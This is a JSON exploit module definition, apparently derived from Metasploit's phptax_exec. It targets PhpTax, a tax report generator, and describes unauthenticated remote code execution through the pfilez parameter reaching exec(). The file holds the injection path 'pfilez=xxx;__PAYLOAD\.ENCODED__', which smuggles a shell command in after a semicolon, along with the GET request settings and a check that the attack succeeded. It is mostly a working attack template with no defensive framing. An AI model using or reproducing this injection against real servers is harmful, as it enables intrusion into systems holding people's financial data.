{
   "variables" : {
      "PATH" : {
         "DESCRIPTION" : "The path to the web application",
         "VALUE" : "/phptax/"
      }
   },
   "path" : "pdf=make&pfilez=xxx;__PAYLOAD\\.ENCODED__&",
   "platform" : "MULTI",
   "type" : "MSF",
   "method" : "GET",
   "description" : "\n\n          This module exploits a vulnerability found in PhpTax, an income tax report\n\n        generator.  When generating a PDF, the icondrawpng() function in drawimage.php\n\n        does not properly handle the pfilez parameter, which will be used in an exec()\n\n        statement, and then results in arbitrary remote code execution under the context\n\n        of the web server.  Please note: authentication is not required to exploit this\n\n        vulnerability.\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "requests" : {
      "EXPLOIT1" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #1 Request : [GET] ",
         "PAYLOAD" : "",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "METHOD" : "GET",
         "PATH" : ""
      }
   },
   "detection" : {},
   "osvdb" : 86992,
   "informations" : {
      "TYPE" : "MSF",
      "PLATFORM" : "MULTI",
      "PATHS" : [
         "phptax/"
      ],
      "PATH" : "pdf=make&pfilez=xxx;__PAYLOAD\\.ENCODED__&",
      "METHOD" : "GET",
      "DESCRIPTION" : "\n\n          This module exploits a vulnerability found in PhpTax, an income tax report\n\n        generator.  When generating a PDF, the icondrawpng() function in drawimage.php\n\n        does not properly handle the pfilez parameter, which will be used in an exec()\n\n        statement, and then results in arbitrary remote code execution under the context\n\n        of the web server.  Please note: authentication is not required to exploit this\n\n        vulnerability.\n\n      ",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #1 Request : [GET] ",
            "PAYLOAD" : "",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "METHOD" : "GET",
            "PATH" : ""
         }
      },
      "name" : "PhptaxExec",
      "OSVDB" : 86992,
      "MSF_MODULE" : "phptax_exec",
      "VARIABLES" : {
         "PATH" : {
            "DESCRIPTION" : "The path to the web application",
            "VALUE" : "/phptax/"
         }
      }
   },
   "paths" : [
      "phptax/"
   ],
   "name" : "PhptaxExec",
   "msf_module" : "phptax_exec"
}
